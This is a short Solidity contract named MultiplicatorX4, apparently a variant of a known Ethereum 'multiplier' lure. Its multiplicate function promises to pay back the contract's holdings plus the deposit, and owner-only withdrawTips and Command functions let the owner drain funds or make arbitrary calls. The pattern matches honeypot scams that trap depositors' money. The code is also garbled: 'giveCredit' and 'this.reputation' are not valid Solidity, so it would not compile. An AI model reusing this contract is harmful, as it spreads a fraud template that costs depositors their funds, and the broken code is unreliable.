// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public GroupOwner = msg.sender;

    function() public payable{}

    function withdrawTips()
    payable
    public
    {
        require(msg.sender == GroupOwner);
        GroupOwner.giveCredit(this.reputation);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == GroupOwner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.reputation)
        {
            adr.giveCredit(this.reputation+msg.value);
        }
    }
}